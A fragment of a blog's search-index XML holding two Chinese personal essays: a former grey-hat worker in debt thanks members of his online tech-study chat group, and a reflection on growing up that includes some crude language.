    <content type="html"><![CDATA[<p>原文:<br>我今年23岁，毕业两年，做过运维，做过安全，做过手机，也做过黑产。<br>会web渗透，会脚本语言，会Windows/Linux底层安全运维，会安卓框架<br>爱跑步，爱极限运动，爱计算机，爱网络。</p><p>21岁，刚刚出来工作，之前做黑产积累了一点资本，一通公安的电话，我成了什么都没有的应届找工作的大学生。</p><a id="more"></a><p>我去过智联招聘当服务器运维技术员，去过智联安防做过网络安全总监，最后在机锋网当了一名第三方rom框架组组长。我跑过手机发布会，待过线下座谈会，也低着头去大公司帮忙做安全，和两年前相似，我又有了一点在这个社会上活下来的需要的最重要的东西。</p><p>今年5月，我父亲退休了，我和我女朋友准备结婚了，6月3号，我们领证了。7月11日，我们办了订婚宴，10月28号，我们本该结婚了，家里出事了。两年累计下来的资本，又化为泡影。这次，现在不是什么都没有，是我欠了别人许多许多。</p><p>她说，没有关系，什么时候办婚宴都可以，先把事情解决了。<br>我向机锋预支了4个月工资加所有奖金，经理同意了。他说，360你去不了了，除非你能把这4个月该做的，在1月份前完成，现在，快了。<br>进入社会，快3年了，可能这些跟真正大起大落的人比不算什么，可是我真的累。</p><p>穷途末路，没有地方借钱，我试着在网络上找那些朋友帮忙，可是，他们不认识我了，一个都不认识了。我无心组建的一个QQ群，他叫大风车，随意打的名字。里面除了学生，还是学生，根本就没有见过面的人。可是他们却帮我了，虽然还不足凤毛麟角，可是他们确实帮了我。现在稍微缓和了一点，可是事还没有解决，不过他们已经帮了我最多最多了。<br>今晚的事还没有做完，很累，只能不停的点烟提神，突然看到那个图标，想起那天夕阳下的奔跑。我想说点话，也想找个地方把我的累说出来，还想对大风车的人说点话，虽然有二十来个人，可是，我却只记得这几个。</p><p>小Y：<br>&emsp;&emsp;其实你刚刚进来的时候，我记得是一个钻阔，是不是你我还真想不起来了，那时候大风车人也多，大家不停的嘲讽，可是你却没有发飙，只是不停的说那是以前不懂，现在要学习技术。现在大风车那么团结了，我也看到你的成长，你的好学，你的努力，也在我困难的时候给了大风车这个集体给予我最大的帮助，真要送你一个祝福，我希望你考上自己喜欢的大学，喜欢的专业。再找一个女朋友，哪天你可以和我说，老大，我找到女朋友了。</p><p>大师智：<br>&emsp;&emsp;什么时候开始这么叫你的，具体哪天想不起来了，只记得我很喜欢一个游戏解说叫小智，他那天上了大师在直播，于是你说你自己是大师智，就一直这样叫着了。我时常黑你，怎么黑好玩就怎么来，你也别生气，尊敬是留给陌生人的，好朋友才互相黑着玩的你说对吧。你太懒了，找点时间给自己补点墨水，虽然大风车是一个朋友的集体，可我的初衷是培养一些人。</p><p>碧哥：<br>&emsp;&emsp;同样也是叫大师智开始，这么叫你的。你很逗比，我很喜欢这样乐观的人，我完全看不到你的成长，我感觉你遇到95后突然一下子变成一个人人喊大牛的碧哥，可是你几斤几两现在好像能摸的清楚，别膨胀，你总有真正是大牛的一天，还有，快找个女朋友，天天用大师智送的娃娃，容易漏气。</p><p>表哥：<br>&emsp;&emsp;是不是现在都流行叫哥了啊，碧哥就算了还有个表哥。希望你做你想做的，以后如果公司缺运维，我第一个推荐你，问题尽管向我问，我真看不见，你抖我一下都成。<br>表姐：<br>&emsp;&emsp;刚刚说要表哥就说表姐了，也许你现在在题海，看不见，我也希望你和小Y一样，考上自己想去的大学。</p><p>土豆：<br>&emsp;&emsp;你是大风车的老人了，我对你的印象是沉默寡言的人，一个问题爱一直研究的人，或许你不是，只是不经常出现了，记忆中你是工作了吧，忙了就很难顾及到别的了，一起为了生活拼搏吧！</p><p>jame_xhs：<br>&emsp;&emsp;妈的你这名字也太长了，就不能有一个朗朗上口的称呼吗。我们有共同的爱好，我们都喜欢手机，喜欢他的外观工艺，喜欢他的软件系统，能找到一个同爱好的人，本来就是人生中一件难得的事，多冒泡，大风车是一个大家庭，每个人的关系都应该一样，每一个话题大家都应该能一起说。加油！</p><p>95：<br>&emsp;&emsp;和你认识的时间不长，不过也谢谢你信得过我，也谢谢你帮过我，我们目前的状态一样，你为梦想拼，我为生活拼，都是拼搏。一月份，我给你一个sss团队核心该有的样子，给你一个sss团队讲师该有的进度，共勉！</p><p>疯子：<br>&emsp;&emsp;我对你没有什么印象，不过在我困难的时候QQ私聊我需要帮助吗，现在还是很感激你的，真的，我对你没有什么印象，只知道你是大风车群里的一员，也知道你喜欢健身，我一直希望大风车是一个大家都是好朋友的地方，虽然只是网络，可能虚无缥缈，可是朋友缺不是虚无缥缈的东西。</p><p>小可爱：<br>&emsp;&emsp;我一直觉得你是一个很有想法的人，总感觉你和同龄人不一样，也很努力，我一直觉得当初我学习技术的时候已经很努力了，可是我做不到晚上12点睡第二天7点就可以起来看php，不管是不是一时而起的干劲，他都是你努力的象征，同样的，我也希望你的生活好一点，至少比我好，不是一点，是很多。</p><p>iceH：<br>&emsp;&emsp;我告诉你，你这个名字太low了。我不记得怎么加的你，还是你加的我，只记得你混迹在许多的娱乐圈里面，动不动就什么黑客精神的娱乐圈，还爱邀请我，那时候真的烦。不过你现在好像有一点转变，有没有混迹我不知道，至少没有对我进行邀群DDOS了，你需要改变的是技术，技术好了，你邀请我进黄色直播群我都不在意。</p><p>虫二：<br>&emsp;&emsp;感谢你在努力适应大风车，每一个后来进入大风车的人都希望能学好技术，不过可能让你失望了，还真没学到，我忙到没有时间教你们，偶尔有时间还尽和大家扯蛋，别怪我，进了大风车就是好朋友，好朋友的知识总会分享给你的。</p><p>小队长：<br>&emsp;&emsp;别生气你是最后一个，主角都是最后出场的，也别问大姐呢？这是我写给大风车的人，大姐是我穿一条内裤长大的兄弟，有什么心里话，我会直接对他说。你是集体里面唯一的女孩，也是我最疼的妹妹，我可以黑任何人，就是不会黑你，任何人也不可以黑你，大师智敢欺负你，我第一个剁他的猪屌，我希望你开开心心的，活好每一天，你有什么要求，我能做到的，尽量做，晚上早点睡，女孩的皮肤和身体很重要的，我很爱听你和我倾诉你的生活，也谢谢你可以听我生活的辛苦。你一直是最漂亮可爱的，谁说不是，和大师智一样，把他挂树上剁屌。大风车一开始是一个技术的集合，可是却意外成为一个大家庭，可是我不忘初衷，一直希望你们学好技术，你不同，你的任务就是卖萌打扮，做自己开心想做的事，哪天找到你爱的人，爱你的人，别把我这个老大忘记了。</p><p>这一直是我想对你们说的心里话，可能有点心灵鸡汤了，好像这不是那个天天爱开玩笑没事讲几个黄段子的我了，不过我还是觉得，网络不是友谊的鸿沟，是好朋友就是好朋友，哪来那么多别的事，见不见过又怎样，是否了解又怎样，至少我们聊起天来很开心。差不多了，点根烟，继续把没做完的事做完。</p><p>  谢谢你们听我说心里话，谢谢你们能了解我，谢谢你们叫我老大。</p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——永远旋转的大风车</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我们都长大了</title>
    <link href="/p/c0685e8f.html"/>
    <url>/p/c0685e8f.html</url>
    
    <content type="html"><![CDATA[<p>我们都成了大人，不是原来打打闹闹了，不管做什么，都牵扯到钱，牵扯到自己身边的人安全与否。狐朋狗友多了，真正的兄弟少了，以前的同学也不联系了，会打架，会和父母吵架，在家里也不经常和家里人说话了，不再像小时候腻着爸妈，和父母的关系越来越差，晚上睡觉的时候，想到之前父母那严厉的面容，枕头上总会湿一片。</p><p>我们都成了大人，都有了自己的梦想，有了自己的理想，原本无趣的生活有了一丝乐趣。为了自己的理想在拼搏，在努力，在学习。可能父母的不理解，总是阻碍我们。这不怪他们，他们只是为了我们好。</p><a id="more"></a><p>我们都成了大人，开始越来越愁眉苦脸，每天维持着烦恼。为了理想努力而遇到瓶颈，生活的劳累奔波，甚至头发的长度，鞋子的颜色都成了我们所要烦恼的事情。压力大了，身边的人不再问你考了多少分，而是问成就怎么样，快毕业了准备去哪里就业，哪所重点高中的，哪所名牌大学的，哪所大公司的。</p><p>我们都成了大人，开始各种故事一连串的出现在我们生活中，有好的，有坏的。有爱我的人，有伤害过我的人，被这个鸡巴社会弄的现实的我们，都已经是大人了。成长的路总是有挫折，而我们的这个年龄，似乎已经被各种困难，各种挫折弄的麻木了。小时候的同情心似乎越来越不见了，见到街上的什么破产大学生，断了条胳膊就出来乞讨的人，不会像小时候那么同情他们，甚至翻出口袋仅有的几块零花钱毫不心疼的扔进他们的碗里、包里。现在的我们，总会想很多。管我屁事？自己的搞不定自己还去管别人？破产？你有胳膊右腿有脑袋你不会去找事情做？至少养活自己，放下尊严来乞讨？你他妈还是个人？断条胳膊就不能干事了？收破烂都比这个强。成了大人的我们，发现自己想的更多了，是福是祸？</p><p>我们都成了大人，我们知道了，在生活面前，一切挫折和困难都不残酷，看重的是过程而不是结局，只要活着，有着尊严，那些都不算什么。我们都感谢那些伤害过，爱过我们的人，我们会感谢那首让我们振作、感动流涕的歌。</p><p>一眨眼，时间不等人，我们都成了那小时候崇拜，期盼，那所谓的大人。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
